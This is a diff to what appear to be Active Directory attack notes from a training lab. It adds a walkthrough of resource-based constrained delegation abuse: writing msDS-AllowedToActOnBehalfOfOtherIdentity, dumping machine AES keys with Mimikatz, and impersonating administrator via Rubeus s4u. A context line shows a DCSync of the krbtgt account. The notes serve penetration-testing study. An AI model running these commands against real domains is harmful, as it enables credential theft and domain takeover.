@@ -18,6 +18,7 @@
   * [Targeted Kerberoasting Set SPN](#privilege-escalation-using-targeted-kerberoasting-set-spn)
   * [Kerberos Unconstrained Delegation](#privlege-escalation-using-kerberos-unconstrained-delegation)
   * [Kerberos Constrained Delegation](#privilege-escalation-using-kerberos-constrained-delegation)
+  * [Kerberos Resource-Based Constrained Delegation](#privilege-escalation-using-kerberos-resourcebased-constrained-delegation)
 * [Kerberos](#kerberos)
   * [Introduction](#introduction)
   * [Kerberos Delegation](#kerberos-delegation)
@@ -657,6 +658,34 @@ After the injection we can run DCSync
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
 
+### Privilege escalation using Kerberos ResourceBased Constrained Delegation
+This moves delegation authority to the resource/service adminstrator. Instead of SPNs on msDs-AllowedToDelegateTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalAllowedToDelegateToAccount) on the resource/service like SQL service.
+That is, the resource/service adminstrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins
+
+To abuse RBCD in the most effective form, we just need two privileges:
+1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
+2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain -ms-DS-MachineAccountQuota is 10 for all Domain users)
+
+Having admin privileges on student machine that is domain joined machine. Enumeration will show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
+```
+Find-InterestingDomainACL | ?{$_.identifyreferencename -match 'ciadmin'}
+```
+
+Using the ADModule, configure RBCD on dcorp-mgmt for student machine:
+```
+$comps = '<machine_account>','<machine_account>'
+Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
+```
+
+Now we can get the privileges of student machines by extracting its AES keys
+```
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+Use the AES key of the student machine with Rubeus and access dcorp-mgmt as ANY user we want:
+```
+Rubeus.exe s4u /user:<student_machine_username> /aes:<aes256_student_machine> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+```
 
 
 <div style="page-break-after: always;"></div>
